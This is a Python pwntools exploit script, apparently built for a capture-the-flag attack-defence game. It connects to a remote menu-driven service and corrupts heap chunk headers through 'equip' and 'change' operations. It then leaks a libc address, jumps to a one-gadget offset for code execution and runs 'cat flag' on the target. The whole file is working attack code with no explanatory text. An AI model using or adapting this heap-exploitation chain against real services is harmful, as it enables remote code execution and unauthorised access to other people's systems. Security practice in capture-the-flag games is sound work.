from pwn import *  # pylint: disable=unused-import

def attack(target):
	ip, port = target.split(':')
	try:
		p = remote(ip, port)

		def equip(size, des='\n'):
			p.sendline("2")
			p.recvuntil("spear:\n")
			p.sendline(str(size))
			p.recvuntil("description:\n")
			p.send(des)
			p.recvuntil("choise:\n")

		def change(index, size, des='\n'):
			p.sendline("4")
			p.recvuntil("index:\n")
			p.sendline(str(index))
			p.recvuntil("decoration?\n")
			p.sendline(str(size))
			p.recvuntil("Please:\n")
			p.send(des)
			p.recvuntil("choise:\n")

		equip(20)
		equip(20)
		change(0, 24, p64(0)*3+p64(0xa1))
		change(1, 0x100, p64(0)*3+p64(0x20f81)+p64(0) *
		       10+p64(0xa0)+p64(0x21)+p64(0)*3+p64(0x21))
		p.sendline("3")
		p.sendline("1")
		p.recvuntil("choise:\n")
		change(0, 25, p64(0)*3+p64(0xa1)+'\x98')
		p.sendline("5")
		p.sendline("1")
		p.recvuntil("spear is :", timeout=1)
		addr = p.recvuntil("\n")[:-1]
		libc = u64(addr.ljust(8, '\x00'))-0x3c4b88
		#print hex(u64(addr.ljust(8,'\x00'))-0x3c4b88)
		one = libc+0xf1147
		p.sendline("1")
		p.sendline("1")
		p.recvuntil("choise:\n", timeout=1)
		p.sendline("1")
		p.sendline("1")
		p.recvuntil("choise:\n", timeout=1)
		p.sendline("1")
		p.sendline("1")
		p.recvuntil("choise:\n", timeout=1)
		p.sendline("1")
		p.recvuntil("choise:\n", timeout=1)
		p.sendline("1")
		sleep(0.5)
		p.send(p64(one))
		p.sendline("cat flag")
		return port[0]+'\\'+p.recv(timeout=1)
	except:
		return ''
